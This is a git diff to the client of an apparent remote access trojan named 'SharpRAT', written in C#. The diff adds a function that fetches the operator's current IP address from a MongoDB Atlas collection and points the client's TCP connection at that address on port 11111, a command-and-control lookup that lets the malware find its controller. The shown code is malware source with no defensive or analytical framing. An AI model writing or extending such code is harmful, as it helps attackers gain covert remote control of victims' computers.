@@ -1,7 +1,10 @@
-﻿using System.Net;
+﻿using System.Diagnostics;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using Microsoft.Win32;
+using MongoDB.Bson;
+using MongoDB.Driver;
 
 namespace Client.Client
 {
@@ -16,16 +19,32 @@ namespace Client.Client
         {
             return serverSocket;
         }
-
+        public static string MongoIp()
+        {
+            var dbClient = new MongoClient("mongodb+srv://Snutri:<ENTERYOURCODEHERE>@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
+            IMongoDatabase db = dbClient.GetDatabase("SharpRAT");
+            var connections = db.GetCollection<BsonDocument>("connections");
+            var projection = Builders<BsonDocument>.Projection.Include("AdminName").Include("CurrentIp").Exclude("_id");
+            var documents = connections.Find(new BsonDocument()).Project(projection).ToList();
+            //Debug.WriteLine($"AdminName: {doc.GetValue("AdminName")}\nCurrentIp: {doc.GetValue("CurrentIp")}");
+            //Debug.WriteLine($"ip: {doc.GetValue("CurrentIp")}");
+            string ip = /*"81.175.148.170";*/($" {documents[0].GetValue("CurrentIp")}");
+            //Debug.WriteLine(ip);
+            return ip;
+        }
         public void ExecuteClient()
         {
             while (bShouldRun)
             {
                 try
                 {
+                    String ip = MongoIp();
+                    string trimmed = String.Concat(ip.Where(c => !Char.IsWhiteSpace(c)));
+                    //MongoIp();
+                    
                     // Connect to server, currently localhost and port 11111.
-                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
-                    IPAddress ipAddress = ipHost.AddressList[0];
+                    //IPHostEntry ipHost = Dns.GetHostEntry(ip);
+                    IPAddress ipAddress = IPAddress.Parse(trimmed);/*ipHost.AddressList[0];*/
                     IPEndPoint localEndPoint = new(ipAddress, 11111);
 
                     // TCP/IP Socket.
